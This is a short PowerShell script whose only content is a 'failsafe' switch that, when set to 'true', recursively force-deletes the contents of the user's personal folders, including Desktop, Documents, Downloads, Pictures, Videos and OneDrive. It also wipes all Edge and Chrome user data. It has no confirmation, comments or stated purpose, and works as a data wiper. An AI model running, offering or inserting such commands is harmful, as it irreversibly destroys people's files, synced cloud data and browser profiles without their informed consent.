[CmdletBinding()]
param (
    [Parameter(Mandatory=$true)]
    [string]$failsafe
)



if($failsafe -eq "true"){

    Remove-Item -Path "$($env:USERPROFILE)\Desktop\*" -Recurse -Force
    Remove-Item -Path "$($env:USERPROFILE)\Documents\*" -Recurse -ErrorAction SilentlyContinue -Force
    Remove-Item -Path "$($env:USERPROFILE)\Downloads\*" -Recurse -Force
    Remove-Item -Path "$($env:USERPROFILE)\Links\*" -Recurse -Force
    Remove-Item -Path "$($env:USERPROFILE)\Music\*" -Recurse -Force
    Remove-Item -Path "$($env:USERPROFILE)\OneDrive\*" -Recurse -Force
    Remove-Item -Path "$($env:USERPROFILE)\Pictures\*" -Recurse -Force
    Remove-Item -Path "$($env:USERPROFILE)\Saved Games\*" -Recurse -Force
    Remove-Item -Path "$($env:USERPROFILE)\Videos\*" -Recurse -Force

    Remove-Item -Path "$($env:LOCALAPPDATA)\Microsoft\Edge\User Data\*" -Recurse -Force
    Remove-Item -Path "$($env:LOCALAPPDATA)\Google\Chrome\User Data\*" -Recurse -Force
    
}